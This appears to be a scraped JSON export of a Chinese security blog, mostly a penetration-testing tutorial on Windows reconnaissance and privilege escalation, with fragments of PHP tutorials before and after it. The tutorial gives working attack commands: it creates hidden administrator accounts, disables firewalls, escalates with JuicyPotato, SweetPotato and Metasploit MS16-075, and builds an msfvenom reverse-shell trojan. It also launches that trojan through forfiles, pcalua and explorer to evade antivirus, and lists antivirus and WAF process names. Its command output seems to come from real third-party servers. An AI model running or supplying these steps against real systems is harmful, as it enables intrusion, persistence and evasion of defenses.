&quot;steady&quot;;?&gt;","categories":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/categories/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"PHP开发学习","slug":"PHP开发学习","permalink":"http://s1eady.top/tags/PHP%E5%BC%80%E5%8F%91%E5%AD%A6%E4%B9%A0/"}]},{"title":"渗透测试--windows系统信息收集与提权-(2)","slug":"渗透测试--windows系统信息收集与提权-(2)","date":"2019-12-11T21:33:56.000Z","updated":"2020-11-21T09:51:05.868Z","comments":true,"path":"2019/12/12/渗透测试--windows系统信息收集与提权-(2)/","link":"","permalink":"http://s1eady.top/2019/12/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(2)/","excerpt":"","text":"常用信息收集命令netstat -ano1C:\\xampp\\htdocs\\attachments\\date_202006&gt; netstat -ano 解释： 12345678910111213141516171819202122232425262728293031協定 本機位址 外部位址 狀態 PIDProto Local Address Foreign Address State TCP 0.0.0.0:80 0.0.0.0:0 LISTENING 1964 TCP 0.0.0.0:81 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:82 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:83 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:84 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:85 0.0.0.0:0 LISTENING 4 TCP 0.0.0.0:88 0.0.0.0:0 LISTENING 4 TCP 210.65.11.201:50913 111.221.29.254:443 TIME_WAIT 0 TCP 210.65.11.201:50918 40.90.22.187:443 ESTABLISHED 392 TCP 210.65.11.201:50919 117.18.237.29:80 ESTABLISHED 392 TCP 210.65.11.201:50920 52.139.153.205:443 ESTABLISHED 392 TCP 210.65.11.201:50921 52.229.171.202:443 TIME_WAIT 0 TCP 210.65.11.201:50922 40.91.91.94:443 TIME_WAIT 0 TCP 210.65.11.201:50923 111.221.29.254:443 ESTABLISHED 1908 TCP 210.65.11.201:50924 210.65.144.217:80 TIME_WAIT 0 TCP 210.65.11.201:50925 20.189.73.166:443 TIME_WAIT 0 TCP 210.65.11.201:50926 111.221.29.254:443 ESTABLISHED 1908 TCP 210.65.11.201:50930 210.65.144.232:80 ESTABLISHED 392 TCP 210.65.11.201:50931 111.221.29.254:443 ESTABLISHED 1908 TCP 210.65.11.201:50932 52.163.83.146:443 ESTABLISHED 8832 TCP [::]:80 [::]:0 LISTENING 1964 UDP 127.0.0.1:1900 *:* 4732 UDP 127.0.0.1:56122 *:* 392 UDP 127.0.0.1:61790 *:* 4732 UDP [::]:123 *:* 360 UDP [::]:500 *:* 392 UDP [::]:3389 *:* 848 UDP [::]:4500 *:* 392 UDP [::]:5353 *:* 1064 协议（Proto ）：TCP ，指是传输层通讯协议 本地机器名（Local Address ）和端口：0.0.0.0:80 远程机器名（Foreign Address ）和端口：52.163.83.146:443 状态列表： LISTEN ：在监听状态中。ESTABLISHED ：已建立联机的联机情况。TIME_WAIT ：该联机在目前已经是等待的状态。 总结 小于1024 的端口通常运行一些网络服务，大于1024 的端口用来与远程机器建立连接。 0.0.0.0 是对外开放，通过服务域名、ip可以访问的端口 127.0.0.1 只能对本机 localhost访问，也是保护此端口安全性 ::: 这三个: 的前两个”::”，是“0:0:0:0:0:0:0:0”的缩写，相当于IPv6的”0.0.0.0”，就是本机的所有IPv6地址，第三个:是IP和端口的分隔符 whoami /PRIVwhoami /PRIV命令可以查看用户的权限 1234567891011D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; whoami &#x2F;privPRIVILEGES INFORMATION----------------------特殊权限名称 描述 状况 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;SeAuditPrivilege 产生安全稽核 已停用SeIncreaseQuotaPrivilege 调整处理程序记忆体配额 已停用SeAssignPrimaryTokenPrivilege 更换处理层权杖 已停用SeChangeNotifyPrivilege 略过周游检查 已启用SeImpersonatePrivilege 验证后模拟用户端 已启用SeCreateGlobalPrivilege 建立全域物件 已启用 net user1234567891011net user [ username [password | * ] [ option ] ] [ &#x2F;domain ]net user administrator 显示administrator用户的信息net user test 123 &#x2F;add 添加一个名为test、密码为123的用户帐户（密码可省略） net user test abc 将test用户的密码更改为abcnet user test &#x2F;del 将test用户删除 net user test &#x2F;active:no 将test用户禁用 输入不带参数的net user 查看计算机上的用户账号列表 123456789101112131415161718C:\\xampp\\htdocs\\attachments\\date_202006&gt; net user\\\\ 的使用者帳戶-------------------------------------------------------------------------------Administrator DefaultAccount Guest test WDeployAdmin WDeployConfigWriter -------------------------------------------------------------------------------Administrator banli fa080 Guest kaichu LUXIAOYU ooo steady 删除用户 12345678910111213net user steady &#x2F;delAdministrator banli fa080 Guest kaichu LUXIAOYU ooo 显示管理员组中的所有成员 1net localgroup administrators 查看用户Administrator的信息 12345678910111213141516171819202122C:\\xampp\\htdocs\\attachments\\date_202006&gt; net user Administrator使用者名稱 Administrator全名 註解 管理電腦/網域的內建帳戶使用者的註解 國家/區域碼 000 (系統預設值)帳戶使用中 Yes帳戶到期 從不上次設定密碼 2019/5/22 下午 09:17:02密碼到期 2019/7/3 下午 09:17:02可變更密碼 2019/5/22 下午 09:17:02請輸入密碼 Yes使用者可以變更密碼 Yes容許的工作站 全部登入指令檔 使用者設定檔 主目錄 上次登入時間 2020/6/12 下午 09:00:01可容許的登入時數 全部本機群組會員 *Administrators 全域群組會員 *None 命令已經成功完成。 激活用户 1net user guest &#x2F;active:yes 激活guest用户 systeminfo查看操作系统信息 1C:\\xampp\\htdocs\\attachments\\date_202006&gt; systeminfo 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960C:\\xampp\\htdocs\\attachments\\date_202006&gt; systeminfo主機名稱: BV550191590002作業系統名稱: Microsoft Windows Server 2016 Datacenter作業系統版本: 10.0.14393 N/A 組建 14393作業系統製造商: Microsoft Corporation作業系統設定: 獨立伺服器作業系統組建類型: Multiprocessor Free註冊的擁有者: BV550191590002註冊公司: chttl產品識別碼: 00376-40000-00000-AA947原始安裝日期: 2019/2/12, 下午 02:57:55系統開機時間: 2020/6/10, 下午 05:43:40系統製造商: VMware, Inc.系統型號: VMware Virtual Platform系統類型: x64-based PC處理器: 已安裝 2 處理器。 [01]: Intel64 Family 6 Model 37 Stepping 1 GenuineIntel ~2400 Mhz [02]: Intel64 Family 6 Model 37 Stepping 1 GenuineIntel ~2400 MhzBIOS 版本: Phoenix Technologies LTD 6.00, 2015/9/17Windows 目錄: C:\\Windows系統目錄: C:\\Windows\\system32開機裝置: \\Device\\HarddiskVolume1系統地區設定: zh-tw;中文 (台灣)輸入法地區設定: zh-tw;中文 (台灣)時區: (UTC+08:00) 台北實體記憶體總計: 8,191 MB可用實體記憶體: 5,350 MB虛擬記憶體: 大小上限: 9,471 MB虛擬記憶體: 可用: 6,445 MB虛擬記憶體: 使用中: 3,026 MB分頁檔位置: C:\\pagefile.sys網域: WORKGROUP登入伺服器: N/AHotfix: 已安裝 17 Hotfix。 [01]: KB3192137 [02]: KB4091664 [03]: KB4093137 [04]: KB4132216 [05]: KB4465659 [06]: KB4485447 [07]: KB4498947 [08]: KB4503537 [09]: KB4509091 [10]: KB4512574 [11]: KB4520724 [12]: KB4521858 [13]: KB4524244 [14]: KB4540723 [15]: KB4550994 [16]: KB4562561 [17]: KB4561616網路卡: 已安裝 1 NIC。 [01]: vmxnet3 乙太網路介面卡 連線名稱: 乙太網路 DHCP 已啟用: 是 DHCP 伺服器: 210.71.253.224 IP 位址 [01]: 210.65.11.201 [02]: fe80::250:56ff:fe80:2244Hyper-V 需求: 偵測到 Hypervisor。將不會顯示 Hyper-V 所需的功能。 net group1键入不带参数的Net group显示服务器名称及服务器的组名称 net group 1234C:\\xampp\\htdocs\\attachments\\date_202006&gt; net group這個命令只能用在 Windows 網域控制站。詳細資料，請輸入 NET HELPMSG 3515。//该主机不是DC，无法使用此命令。 net localgroup1234567891011net localgroup administrators 显示管理员组中的所有成员net localgroup administrators service &#x2F;add将test用户加入到管理员组中net localgroup administrators test &#x2F;del将test用户从管理员组中删除 1234567891011C:\\xampp\\htdocs\\attachments\\date_202006&gt; net localgroup administrators別名 administrators註解 Administrators 可以完全不受限制地存取電腦&#x2F;網域成員-------------------------------------------------------------------------------AdministratorGuestkey$testWDeployAdmin命令已經成功完成 查看端口以及端口对应的服务1234查看对应的端口netstat -ano |findstr &quot;3306&quot;查看对应的服务进程tasklist | findstr PID 建立隐藏账号建立用户账号时，如果在用户名后面加上$符号，就可以建立一个简单的隐藏账号，如”test$”。在字符界面下执行net user命令，无法查看到这个账号，但是在图形界面的”本地用户和组”中仍然可以看到。 1net user awd$ 123 &#x2F;add 安全标识符SID： 执行”whoami /all”命令查看系统当前用户的SID。SID的最后一部分称为相对标识符RID，RID是500的SID是系统内置Administrator账户，即使重命名，其RID仍保持为500不变。 RID为501的SID是Guest账户，后来新建的用户账户的RID都是从1000开始。 查看当前在线的用户1234567D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; query user || qwinsta 使用者名称 工作阶段名称 识别码 状态 闲置时间 登入时间 administrator rdp-tcp#3 1 使用中 . 2020&#x2F;11&#x2F;19 下午 03:32 工作阶段名称 使用者名称 识别码 状态 类型 装置 &gt;console 0 已连线 wdcon rdp-tcp 65536 接听 rdpwd rdp-tcp#3 Administrator 1 使用中 rdpwd 查看当前用户是否在管理员组12345678910111213net localgroup administrators別名 administrators註解 Administrators 可以完全不受限制地存取電腦&#x2F;網域成員-------------------------------------------------------------------------------Administratorbanli$GuestIUSR_TELNETTelNet命令執行成功 12345net user administrator本機群組會員 *Administrators *Performance Monitor U *SQLServer2005SQLBrows*SQLServerMSASUser$REN *SQLServerMSSQLUser$re*SQLServerSQLAgentUser通用群組會員 *None 12net group administrators该命令只能在域控制器中使用。 查看防火墙显示防火墙状态 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; netsh firewall show config网域 设定档组态:-------------------------------------------------------------------操作模式 &#x3D; 停用例外模式 &#x3D; 启用多点传送&#x2F;广播回应模式 &#x3D; 启用通知模式 &#x3D; 启用网域 设定档的服务设定:模式 自订 名称-------------------------------------------------------------------启用 否 档案及印表机共用网域 设定档允许的程式设定:模式 名称 &#x2F; 程式-------------------------------------------------------------------启用 Message Queuing &#x2F; C:\\WINDOWS\\system32\\mqsvc.exe网域 设定档的连接埠设定:连接埠 通讯协定 模式 名称-------------------------------------------------------------------139 TCP 启用 NetBIOS Session Service445 TCP 启用 SMB over TCP137 UDP 启用 NetBIOS Name Service138 UDP 启用 NetBIOS Datagram Service标准 设定档组态:-------------------------------------------------------------------操作模式 &#x3D; 启用例外模式 &#x3D; 启用多点传送&#x2F;广播回应模式 &#x3D; 启用通知模式 &#x3D; 启用标准 设定档的服务设定:模式 自订 名称-------------------------------------------------------------------启用 否 远端桌面标准 设定档允许的程式设定:模式 名称 &#x2F; 程式-------------------------------------------------------------------启用 3389 &#x2F; C:\\wmpub\\wmiislog\\Saom\\3389.exe启用 3389 &#x2F; C:\\Documents and Settings\\IUSR_TELNET\\桌面\\3389.exe标准 设定档的连接埠设定:连接埠 通讯协定 模式 名称-------------------------------------------------------------------80 TCP 启用 JCINWEB21 TCP 启用 FTP3389 TCP 启用 远端桌面记录设定:-------------------------------------------------------------------档案位置 &#x3D; C:\\WINDOWS\\pfirewall.log最大档案大小 &#x3D; 4096 KB丢弃的封包 &#x3D; 停用连线 &#x3D; 停用存取被拒。 123456789101112131415查看防火墙规则对某端口的规则netsh advfirewall firewall show rule name&#x3D;all規則名稱: 遠端桌面 - 使用者模式 (TCP-In)----------------------------------------------------------------------啟用: 是方向: 在設定檔: 網域,私人,公用群組: 遠端桌面LocalIP: 任一RemoteIP: 任一通訊協定: TCP本機連接埠: 3389遠端連接埠: 任一邊緣周遊: 否動作: 允許 关闭防火墙12winserver 2003之前：netsh firewall set opmode disablewinserver 2003之后：netsh advfirewall set allprofiles state off 开启防火墙1netsh firewall set opmode mode&#x3D;enable 3389端口12查询远程桌面服务是否开启REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections 1表示关闭，0表示开启 12查询远程桌面服务端口REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumber 端口号十六进制表示，0xd3d转换成十进制后为3389 12345命令行开启远程桌面REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;fREG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; &#x2F;v PortNumber &#x2F;t REG_DWORD &#x2F;d 0x00000d3d &#x2F;f命令行关闭远程桌面REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 11111111 &#x2F;f 关闭远程桌面 突破防火墙连接3389端口 1234防火墙默认阻断了3389的连接，需要手动开启，执行如下命令netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow或者直接关闭防火墙netsh firewall set opmode mode&#x3D;disable 常见用户尝试连接 1234C:\\phpStudy\\WWW\\yxcms&gt; net user whoami Steady123 &#x2F;add命令成功完成。 C:\\phpStudy\\WWW\\yxcms&gt; net localgroup administrators whoami &#x2F;add 查看系统进程123456789101112131415161718C:\\&gt; tasklistImage Name PID Session Name Session# Mem Usage========================= ======== ================ =========== ============System Idle Process 0 0 24 KSystem 4 0 52 Ksmss.exe 312 0 632 Kcsrss.exe 396 0 2,736 Kwininit.exe 448 0 764 Kcsrss.exe 456 1 336 Kwinlogon.exe 488 1 1,048 Kservices.exe 544 0 8,416 Klsass.exe 552 0 17,500 Klsm.exe 560 0 4,108 Ksvchost.exe 664 0 14,340 Ksvchost.exe 740 0 7,808 KMsMpEng.exe 808 0 186,060 KLogonUI.exe 828 1 1,224 Ksvchost.exe 928 0 64,288 K 查看已启动的程序信息1234567891011121314D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; wmic startup get command,captionCaption Command ctfmon.exe C:\\WINDOWS\\system32\\CTFMON.EXE ctfmon.exe C:\\WINDOWS\\system32\\CTFMON.EXE ctfmon.exe C:\\WINDOWS\\system32\\CTFMON.EXE desktop desktop.ini Windows Search C:\\PROGRA~1\\WINDOW~4\\WINDOW~1.EXE &#x2F;startup IMJPMIG8.1 &quot;C:\\WINDOWS\\IME\\imjp8_1\\IMJPMIG.EXE&quot; &#x2F;Spoil &#x2F;RemAdvDef &#x2F;Migration32 IMEKRMIG6.1 C:\\WINDOWS\\ime\\imkr6_1\\IMEKRMIG.EXE CJIMETIPSYNC C:\\Program Files\\Common Files\\Microsoft Shared\\IME\\IMTC65\\CHANGJIE\\CINTLCFG.EXE &#x2F;CJIMETIPSync PHIMETIPSYNC C:\\Program Files\\Common Files\\Microsoft Shared\\IME\\IMTC65\\PHONETIC\\TINTLCFG.EXE &#x2F;PHIMETIPSync MsmqIntCert regsvr32 &#x2F;s mqrt.dll Adobe ARM &quot;C:\\Program Files\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe&quot; SunJavaUpdateSched &quot;C:\\Program Files\\Common Files\\Java\\Java Update\\jusched.exe&quot; 查看系统体系架构1echo %PROCESSOR_ARCHITECTURE% 常见软件杀毒进程12345678910&#123;&quot;360tray.exe&quot;, &quot;360安全卫士&quot;&#125;,&#123;&quot;360sd.exe&quot;, &quot;360杀毒&quot;&#125;,&#123;&quot;a2guard.exe&quot;, &quot;a-squared杀毒&quot;&#125;,&#123;&quot;ad-watch.exe&quot;, &quot;Lavasoft杀毒&quot;&#125;,&#123;&quot;cleaner8.exe&quot;, &quot;The Cleaner杀毒&quot;&#125;,&#123;&quot;vba32lder.exe&quot;, &quot;vb32杀毒&quot;&#125;,火绒hipstray.exewsctrl.exeusysdiag.exe 常见WAF进程12345678910111213安全狗SafeDogGuardCenter.exesafedogupdatecenter.exesafedogguardcenter.exeSafeDogSiteIIS.exeSafeDogTray.exeSafeDogServerUI.exeD盾D_Safe_Manage.exed_manage.exe云锁yunsuo_agent_service.exeyunsuo_agent_daemon.exe 补丁安装情况与漏洞信息收集Windows-Exploit-Suggester该工具可以将目标系统的补丁安装情况与微软的漏洞数据库进行对比，进而检测出目标系统中潜在的未修复漏洞。同时此工具还会告知用户针对于此漏洞是否有公开的exp和可用的Metasploit模块。 自动化地从微软下载漏洞补丁数据库，并将其以Excel表格的形式保存。 1234➜ Windows-Exploit-Suggester-master .&#x2F;windows-exploit-suggester.py --update[*] initiating winsploit version 3.3...[+] writing to file 2020-11-17-mssb.xls[*] done 补丁信息收集 1234567891011121314➜ Windows-Exploit-Suggester-master python windows-exploit-suggester.py --database 2020-11-17-mssb.xls --systeminfo 1.txt[*] initiating winsploit version 3.3...[*] database file detected as xls or xlsx based on extension[*] attempting to read from the systeminfo input file[+] systeminfo input file read successfully (utf-8)[*] querying database file for potential vulnerabilities[*] comparing the 0 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits[*] there are now 356 remaining vulns[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin[+] windows version identified as &#x27;Windows 2003 SP2 32-bit&#x27;[*][M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important[*] https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC[*] https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF 可以看到目标系统为Windows 2003 SP2 32-bit，对应的漏洞信息会显示在下面。 cmd查询补丁信息1systeminfo&gt;saul.txt&amp;(for %i in ( KB4013389 KB3199135 KB3186973 KB3178466 KB3164038 KB3143145 KB3143141 KB3136041 K3134228 KB3089656 KB3067505 KB3077657 KB3057839 KB3057191 KB3031432 KB3036220 KB3023266 KB2989935 KB3011780 KB3000061 KB2992611 KB2975684 KB2914368 KB2850851 KB2840221 KB2778930 KB2972621 KB2671387 KB2592799 KB2566454 KB2503665 KB2393802 KB2305420 KB2267960 KB982799 KB2160329 KB977165 KB971468 KB975517 KB970483 KB959454 KB957097 KB958644 KB956803 KB941693 KB921883 KB899588 KB823980 ) do @type saul.txt|@find &#x2F;i &quot;%i&quot;|| @echo %i is Yes)&amp;del &#x2F;f &#x2F;q &#x2F;a saul.txt 1234567891011121314151617KB4013389 is Yes KB3199135 is Yes KB3186973 is Yes KB3178466 is Yes KB3164038 is Yes KB3143145 is Yes KB3143141 is Yes KB3136041 is Yes K3134228 is Yes KB3089656 is Yes KB3067505 is Yes KB3077657 is Yes KB3057839 is Yes KB3057191 is Yes KB3031432 is Yes KB3036220 is Yes KB3023266 is Yes 2003服务器查看补丁1wmic qfe list full 提权信息收集脚本1WinEnum.bat 使用之后会在当前目录下生成report.txt文件。 Windows系统提权脏土豆提权简介烂土豆提权就是俗称的MS16-075。 可以将Windows工作站上的特权从最低级别提升到”NT AUTHORITY \\ SYSTEM” – Windows计算机上可用的最高特权级别。 利用条件权限是否开启1234567891011D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; whoami /privPRIVILEGES INFORMATION----------------------特殊权限名称 描述 状况 ============================= ====================== ======SeAuditPrivilege 产生安全稽核 已停用SeIncreaseQuotaPrivilege 调整处理程序记忆体配额 已停用SeAssignPrimaryTokenPrivilege 更换处理层权杖 已停用SeChangeNotifyPrivilege 略过周游检查 已启用SeImpersonatePrivilege 验证后模拟用户端 已启用SeCreateGlobalPrivilege 建立全域物件 已启用 1234如果开启SeImpersonate权限，juicypotato的参数可以使用-t t如果开启SeAssignPrimaryToken权限，juicypotato的参数可以使用-t u如果均开启，可以选择-t *如果均未开启，那么无法提权 RPC默认端口查看端口是否开启123456D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; netstat -ano | findstr &quot;135&quot; TCP 0.0.0.0:135 0.0.0.0:0 LISTENING 760 TCP 127.0.0.1:3148 127.0.0.1:135 TIME_WAIT 0 TCP 127.0.0.1:3151 127.0.0.1:135 TIME_WAIT 0 TCP 127.0.0.1:3154 127.0.0.1:135 TIME_WAIT 0 TCP 127.0.0.1:3157 127.0.0.1:135 TIME_WAIT 0 查看端口对应的服务如果被修改(例如为1234)，juicypotato的参数可以使用-n 1234 12D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; tasklist | findstr 760svchost.exe 760 Console 0 4,360 K svchost.exe是一个RPC服务。 选择可用的CLSID参考列表 https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md 根据你的系统类型选择CLSID（EG:&#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;） 然后-c指定即可。 选择一个系统未占用的端口作为监听端口-l参数指定即可。 1JuicyPotato.exe -t t -p c:\\windows\\system32\\cmd.exe -l 1111 -c &#123;9B1F122C-2982-4e91-AA8B-E071D54F2A4D&#125;） 即使用SeImpersonate权限创建进程，监听端口1111，使用的CLSID为{8BC3F05E-D86B-11D0-A075-00C04FB68820}来进行提权。 msf利用烂土豆提权123456use exploit&#x2F;windows&#x2F;local&#x2F;ms16_075_reflection_juicyset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset session 1set lhost xx.xx.xx.xxset lport 6666exploit 如果目标系用没有权限则： 1234[*] Started reverse TCP handler on 164.155.95.55:4444 [-] Microsoft Windows before Server 2008 R2 are not vulnerable.[-] Exploit aborted due to failure: no-access: User does not have SeImpersonate or SeAssignPrimaryToken Privilege[*] Exploit completed, but no session was created. 对应的目标系统权限 1234567891011D:\\S_JCIN\\WebSite\\OutWeb\\L_CT\\News&gt; whoami &#x2F;privPRIVILEGES INFORMATION----------------------特殊权限名称 描述 状况 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;SeAuditPrivilege 产生安全稽核 已停用SeIncreaseQuotaPrivilege 调整处理程序记忆体配额 已停用SeAssignPrimaryTokenPrivilege 更换处理层权杖 已停用SeChangeNotifyPrivilege 略过周游检查 已启用SeImpersonatePrivilege 验证后模拟用户端 已启用SeCreateGlobalPrivilege 建立全域物件 已启用 可以看到SeAssignPrimaryToken已停用。 SweetPotato.exe12345678910SweetPotato.exe -a &quot;whoami&quot;Modify by https:&#x2F;&#x2F;www.xljtj.com[+] Attempting DCOM NTLM interception with CLID 4991D34B-80A1-4291-83B6-3328366B9097 on port 6666 using method Token to launch c:\\Windows\\System32\\cmd.exe[+] Intercepted and authenticated successfully, launching program[+] CreatePipe success[+] Created launch thread using impersonated user NT AUTHORITY\\SYSTEM[+] Command : &quot;c:\\Windows\\System32\\cmd.exe&quot; &#x2F;c whoami [+] process with pid: 0 created.&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;[!] Failed to created impersonated process with token: 1349 免杀技巧-执行系统命令方式在渗透测试中，拿到shell之后发现无法调用cmd.exe，可以上传一个自己的cmd.exe。但是有些电脑含有杀毒软件，将监视二进制文件，所以我们需要绕过检测。 Windows系统提供了多个二进制文件，可以使用它们执行任意命令。 前提未正确配置白名单规则（这里涵盖了文件名和路径），使得一些系统可执行文件能够执行。 测试生成木马1msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;10.10.1.10 lport&#x3D;8888 -f exe -o hacker.exe 攻击机监听 免杀绕过Forfiles简介forfiles是Windows Server 2003内置的命令行文件，forfiles是一款windows平台的软件工具，其中选择文件并运行一个命令来操作文件，其它系统未必适用。不过，win2003以上的系统，包括win7、windows server 2008均适用。forfiles 是一个命令实用程序，可以选择多个文件并在它们上运行命令，它通常用于批处理作业中，但可能会被滥用以执行任意命令或可执行文件。 语法1forfiles [&#x2F;p Path ] [&#x2F;m SearchMask ] [&#x2F;s ] [&#x2F;c Command ] [&#x2F;d [&#123;+ | - &#125;] [&#123;MM &#x2F; DD &#x2F; YYYY | DD &#125;]] 1&#x2F;p Path 指定Path ，表明要从哪里开始搜索。默认的文件夹是当前工作目录，该目录通过键入句号(.) 指定。 1&#x2F;m SearchMask 按照SearchMask 搜索文件。默认的SearchMask 是*.* 。 1&#x2F;s 指示forfiles 在子目录中搜索。 1&#x2F;c Command 在每个文件上运行指定的Command 。带有空格的命令字符串必须用引号括起来。默认的Command 是”cmd /c echo @file” 。 1&#x2F;d [&#123;+ | - &#125;] [&#123;MM &#x2F; DD &#x2F; YYYY | DD &#125;] 选择日期大于或等于(+ )（或者小于或等于(- )）指定日期的文件，其中MM / DD / YYYY 是指定的日期，DD 是当前日期减去DD 天。如果未指定+ 或- ，则使用+ 。DD 的有效范围是0 - 32768。 1&#x2F;? 在命令提示符下显示帮助。 1forfiles -p &quot;D:\\testFolder&quot; -s -m &quot;*.csv&quot; -d -100 -c &quot;cmd &#x2F;c del @FILE&quot; 12345-p指定了搜索的根目录为&quot;D:\\testFolder&quot;递归的搜索(-s)搜索到的文件名的匹配模式是&quot;*.csv&quot;文件的日期(创建日期？修改日期？)是100天之前的文件对于所有得到的文件，都执行一个命令为&quot;cmd &#x2F;c del @FILE&quot;，表示要删除这个文件。 应用1forfiles &#x2F;p c:\\windows\\system32 &#x2F;m calc.exe &#x2F;c C:\\tmp\\hacker.exe 123-p指定搜索的根目录&#x2F;m 指定搜索的文件名字-c执行的命令--这里就是执行我们的木马文件。 hacker.exe 将是forfiles.exe子进程。 Pcalua简介Windows进程兼容性助理(Program Compatibility Assistant)的一个组件。当它检测到存在兼容性问题的软件时就会运行。该实用程序位于” C：\\ Windows \\ System32 “中，并且可以使用” -a”参数执行命令。 应用1pcalua.exe -a C:\\tmp\\hacker.exe hacker.exe将是一个新的父进程。 Explorer简介可以将explorer.exe 用作执行方法。执行的有效负载将在系统上创建一个进程，该进程将把explorer.exe作为父进程。 1explorer.exe C:\\tmp\\hacker.exe explorer.exe &#x2F;root,&quot;C:\\tmp\\hacker.exe&quot;explorer.exe 0XAXSDD-Hacker, &quot;C:\\tmp\\hacker.exe&quot;","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"PHP开发学习--核心编程4","slug":"PHP核心编程3","date":"2019-12-09T23:29:22.000Z","updated":"2020-11-15T09:23:19.645Z","comments":true,"path":"2019/12/10/PHP核心编程3/","link":"","permalink":"http://s1eady.top/2019/12/10/PHP%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B3/","excerpt":"","text":"PHP核心编程4PHP与cookie什么是cookie？简单来说，Cookies就是服务器暂时存放在你的电脑里的资料（.txt格式的文本文件），好让服务器用来辨认你的计算机（通常经过加密）； Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key/value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器 Cookie名称和值可以由服务器端开发者定义，这样服务器可以知道该用户是否是合法用户以及是否需要重新登录等，服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。 注意：每种浏览器都可以存储COOKIE数据；各个浏览器之间的COOKIE数据不能共享。 cookie实操1234&lt;?php//添加COOKIE数据setcookie(&quot;username&quot;,&quot;admin&quot;,time()+7*24*3600);setcookie(&quot;password&quot;,&quot;123456&quot;,time()+7*24*3600); 第一次访问请求第一次访问，本地并没有服务端设置发送的cookie，所以请求并不会带上cookie。 1234567891011121314GET &#x2F;php&#x2F;setcookie.php HTTP&#x2F;1.1Host: 127.0.0.1:8888Connection: keep-aliveCache-Control: 